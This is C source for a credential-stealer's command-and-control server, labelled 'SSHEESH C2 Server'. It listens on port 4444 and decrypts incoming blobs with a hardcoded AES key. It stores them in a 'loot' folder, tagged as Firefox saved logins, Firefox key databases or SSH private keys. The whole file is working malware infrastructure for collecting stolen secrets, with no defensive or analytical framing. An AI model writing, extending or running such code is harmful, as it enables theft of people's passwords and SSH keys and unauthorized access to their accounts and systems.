#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <time.h>
#include <pthread.h>

#include "aes.h"
#include "filetypes.h"

#define PORT 4444
#define BUFFER_SIZE 4096
#define SAVE_DIR "./loot"


static const uint8_t key[16] = {
    0x13, 0x37, 0xBA, 0xD0, 0xC0, 0xFF, 0xEE, 0x12,
    0x42, 0x24, 0x81, 0x19, 0x99, 0x88, 0x77, 0x66};

static const uint8_t iv[16] = {
    0x10, 0x32, 0x54, 0x76, 0x98, 0xBA, 0xDC, 0xFE,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF};

pthread_mutex_t id_lock = PTHREAD_MUTEX_INITIALIZER;
int dump_counter = 0;

typedef struct {
    int sock;
    struct sockaddr_in addr;
} client_info_t;

void *handle_client(void *arg) {
    client_info_t *info = (client_info_t *)arg;
    char ipstr[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(info->addr.sin_addr), ipstr, sizeof(ipstr));

    // === Read file type (1 byte) ===
    uint8_t file_type;
    if (recv(info->sock, &file_type, 1, MSG_WAITALL) != 1) {
        perror("[ERROR] recv(file_type)");
        close(info->sock);
        free(info);
        pthread_exit(NULL);
    }

    // === Read payload length (4 bytes) ===
    uint32_t net_len;
    if (recv(info->sock, &net_len, 4, MSG_WAITALL) != 4) {
        perror("[ERROR] recv(length)");
        close(info->sock);
        free(info);
        pthread_exit(NULL);
    }

    size_t padded_len = ntohl(net_len);
    if (padded_len == 0 || padded_len > 10 * 1024 * 1024) {
        fprintf(stderr, "[ERROR] Invalid length received: %zu\n", padded_len);
        close(info->sock);
        free(info);
        pthread_exit(NULL);
    }

    uint8_t *buffer = malloc(padded_len);
    if (!buffer) {
        perror("[ERROR] malloc");
        close(info->sock);
        free(info);
        pthread_exit(NULL);
    }

    // === Receive encrypted payload ===
    size_t total = 0;
    while (total < padded_len) {
        ssize_t n = recv(info->sock, buffer + total, padded_len - total, 0);
        if (n <= 0) {
            perror("[ERROR] recv(data)");
            free(buffer);
            close(info->sock);
            free(info);
            pthread_exit(NULL);
        }
        total += n;
    }

#ifdef DEBUG
    fprintf(stderr, "[DEBUG] Received %zu bytes from %s\n", total, ipstr);
#endif

    // === Decrypt buffer ===
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, buffer, padded_len);

    // === Strip PKCS#7 padding ===
    size_t received = padded_len;
    if (received > 0) {
        uint8_t padding = buffer[received - 1];
        if (padding > 0 && padding <= AES_BLOCKLEN && padding <= received) {
            received -= padding;
#ifdef DEBUG
            fprintf(stderr, "[DEBUG] Stripped %u bytes of padding\n", padding);
#endif
        }
    }

    // === Convert file_type to label ===
    const char *type;
    switch (file_type) {
        case FILETYPE_FIREFOX_LOGINS_JSON: type = "firefox_logins_json"; break;
        case FILETYPE_FIREFOX_KEY4_DB:     type = "firefox_key4_db";     break;
        case FILETYPE_FIREFOX_CERT9_DB:    type = "firefox_cert9_db";    break;
        case FILETYPE_SSH_KEY:     type = "ssh_key";     break;
        default:                           type = "unknown";             break;
    }

    // === Create filename ===
    time_t now = time(NULL);
    struct tm *t = localtime(&now);

    pthread_mutex_lock(&id_lock);
    int id = dump_counter++;
    pthread_mutex_unlock(&id_lock);

    char filename[256];
    snprintf(filename, sizeof(filename),
             SAVE_DIR "/%s_%s_%04d%02d%02d_%02d%02d%02d_%d.bin",
             type, ipstr,
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
             t->tm_hour, t->tm_min, t->tm_sec,
             id);

    FILE *fp = fopen(filename, "wb");
    if (!fp) {
        perror("[ERROR] fopen");
        free(buffer);
        close(info->sock);
        free(info);
        pthread_exit(NULL);
    }

    fwrite(buffer, 1, received, fp);
    fclose(fp);
    close(info->sock);
    free(buffer);
    if (file_type == FILETYPE_FIREFOX_LOGINS_JSON){
    printf("[+] Received Firefox logins JSON (%zu bytes) from %s\n", received, ipstr);
    } 
    printf("[+] Saved blob to: %s\n", filename);
    free(info);
    pthread_exit(NULL);
}

int main(void) {
    mkdir(SAVE_DIR, 0700);

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("[ERROR] socket");
        return 1;
    }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("[ERROR] bind");
        close(server_fd);
        return 1;
    }

    if (listen(server_fd, 10) < 0) {
        perror("[ERROR] listen");
        close(server_fd);
        return 1;
    }

    printf("[+] SSHEESH C2 Server is listening on port %d...\n", PORT);

    while (1) {
        client_info_t *info = malloc(sizeof(client_info_t));
        socklen_t len = sizeof(info->addr);
        info->sock = accept(server_fd, (struct sockaddr *)&info->addr, &len);
        if (info->sock < 0) {
            perror("[ERROR] accept");
            free(info);
            continue;
        }

#ifdef DEBUG
        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(info->addr.sin_addr), ip, sizeof(ip));
        fprintf(stderr, "[DEBUG] Accepted connection from %s\n", ip);
#endif

        pthread_t tid;
        pthread_create(&tid, NULL, handle_client, info);
        pthread_detach(tid);
    }

    close(server_fd);
    return 0;
}
